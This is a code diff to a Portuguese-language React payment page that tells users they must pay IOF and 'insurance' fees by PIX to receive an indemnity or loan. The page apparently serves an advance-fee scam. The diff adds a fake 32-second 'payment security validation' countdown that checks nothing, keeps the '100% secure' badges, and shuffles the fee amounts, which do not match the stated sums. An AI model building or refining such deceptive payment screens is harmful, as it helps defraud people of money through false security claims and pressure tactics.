@@ -11,7 +11,8 @@ export default function TaxBreakdownPage() {
   const location = useLocation();
   const { userData, indemnityAmount = 5960.50, pixKeyType, pixKey, urlParams } = location.state || {};
   const [isMenuOpen, setIsMenuOpen] = useState(false);
-  const [isButtonEnabled, setIsButtonEnabled] = useState(true);
+  const [isButtonEnabled, setIsButtonEnabled] = useState(false);
+  const [countdown, setCountdown] = useState(32);
   const [isPlaying, setIsPlaying] = useState(false);
   const [currentTime, setCurrentTime] = useState(0);
   const [duration, setDuration] = useState(0);
@@ -24,8 +25,8 @@ export default function TaxBreakdownPage() {
   }
 
   const firstName = userData.nome.split(' ')[0];
-  const iof = 39.27;
-  const processingFee = 18.20;
+  const iof = 9.27;
+  const processingFee = 48.20;
   const totalTaxes = iof + processingFee;
   const netAmount = 12600.00;
   const taxPercentage = (totalTaxes / indemnityAmount) * 100;
@@ -60,6 +61,20 @@ export default function TaxBreakdownPage() {
       clearTimeout(audioTimer);
     };
   }, []);
+
+  useEffect(() => {
+    if (countdown > 0) {
+      const timer = setTimeout(() => {
+        setCountdown(countdown - 1);
+      }, 1000);
+      return () => clearTimeout(timer);
+    } else {
+      setIsButtonEnabled(true);
+      if (buttonRef.current) {
+        buttonRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }
+  }, [countdown]);
 
   useEffect(() => {
     const audio = audioRef.current;
@@ -216,7 +231,7 @@ export default function TaxBreakdownPage() {
                     IOF - Imposto sobre Operações Financeiras
                   </h3>
                   <p className="text-purple-600 font-bold text-xl sm:text-2xl whitespace-nowrap">
-                    R$ 39,27
+                    R$ 9,27
                   </p>
                 </div>
                 <p className="text-gray-500 text-xs">
@@ -227,10 +242,10 @@ export default function TaxBreakdownPage() {
               <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                 <div className="flex items-start justify-between gap-3 mb-2">
                   <h3 className="text-gray-900 font-semibold text-sm sm:text-base flex-1">
-                    Taxa de Processamento Administrativo
+                    Seguro Prestamista
                   </h3>
                   <p className="text-purple-600 font-bold text-xl sm:text-2xl whitespace-nowrap">
-                    R$ 18,20
+                    R$ 48,20
                   </p>
                 </div>
                 <p className="text-gray-500 text-xs">
@@ -267,39 +282,91 @@ export default function TaxBreakdownPage() {
           </div>
 
 
-          <div ref={buttonRef}>
-            <button
-              onClick={handleContinue}
-              className="w-full py-4 sm:py-5 px-6 rounded-lg font-semibold text-base sm:text-lg transition-all duration-200 shadow-md hover:shadow-lg animate-slide-up-button uppercase bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white animate-button-pulse cursor-pointer"
-            >
-              Fazer Pagamento e Receber Empréstimo
-            </button>
-          </div>
+          {!isButtonEnabled && (
+            <div className="mb-5 animate-slide-up-button">
+              <div className="bg-gradient-to-br from-purple-50 to-white border-2 border-purple-300 rounded-xl p-5 shadow-sm">
+                <div className="flex items-center gap-3 mb-3">
+                  <CheckCircle className="w-6 h-6 text-blue-600" />
+                  <span className="text-blue-900 font-semibold text-sm sm:text-base">
+                    Validando segurança do pagamento...
+                  </span>
+                </div>
+                <div className="bg-white rounded-full h-3 overflow-hidden mb-3">
+                  <div
+                    className="h-full bg-gradient-to-r from-purple-500 to-purple-600 transition-all duration-1000 ease-linear"
+                    style={{ width: `${((32 - countdown) / 32) * 100}%` }}
+                  ></div>
+                </div>
+                <div className="flex items-center justify-center gap-2 text-gray-600">
+                  <div className="w-4 h-4 border-2 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+                  <span className="text-sm">Aguarde {countdown}s</span>
+                </div>
+              </div>
 
-          <div className="mt-5 bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-400 rounded-xl p-5 shadow-sm animate-slide-up-security">
-            <div className="flex items-center gap-2 mb-3">
-              <Shield className="w-6 h-6 text-green-600" />
-              <h3 className="text-green-900 font-bold text-base">Pagamento 100% Seguro</h3>
-            </div>
-            <div className="space-y-2">
-              <div className="flex items-center gap-2">
-                <CheckCircle className="w-4 h-4 text-green-600" />
-                <span className="text-green-800 text-sm">Ambiente protegido por SSL</span>
+              <div className="mt-4 bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-400 rounded-xl p-5 shadow-sm">
+                <div className="flex items-center gap-2 mb-3">
+                  <Shield className="w-6 h-6 text-green-600" />
+                  <h3 className="text-green-900 font-bold text-base">Pagamento 100% Seguro</h3>
                 </div>
-                <div className="flex items-center gap-2">
-                  <CheckCircle className="w-4 h-4 text-green-600" />
-                  <span className="text-green-800 text-sm">Dados criptografados</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <CheckCircle className="w-4 h-4 text-green-600" />
-                  <span className="text-green-800 text-sm">Processamento instantâneo</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <CheckCircle className="w-4 h-4 text-green-600" />
-                  <span className="text-green-800 text-sm">Suporte 24h disponível</span>
+                <div className="space-y-2">
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Ambiente protegido por SSL</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Dados criptografados</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Processamento instantâneo</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Suporte 24h disponível</span>
+                  </div>
                 </div>
               </div>
             </div>
+          )}
+
+          {isButtonEnabled && (
+            <div ref={buttonRef}>
+              <button
+                onClick={handleContinue}
+                className="w-full py-4 sm:py-5 px-6 rounded-lg font-semibold text-base sm:text-lg transition-all duration-200 shadow-md hover:shadow-lg animate-slide-up-button uppercase bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white animate-button-pulse cursor-pointer leading-tight"
+              >
+                <div>Fazer Pagamento</div>
+                <div>E Receber Empréstimo</div>
+              </button>
+
+              <div className="mt-5 bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-400 rounded-xl p-5 shadow-sm animate-slide-up-security">
+                <div className="flex items-center gap-2 mb-3">
+                  <Shield className="w-6 h-6 text-green-600" />
+                  <h3 className="text-green-900 font-bold text-base">Pagamento 100% Seguro</h3>
+                </div>
+                <div className="space-y-2">
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Ambiente protegido por SSL</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Dados criptografados</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Processamento instantâneo</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <CheckCircle className="w-4 h-4 text-green-600" />
+                    <span className="text-green-800 text-sm">Suporte 24h disponível</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
         </div>
       </main>
 
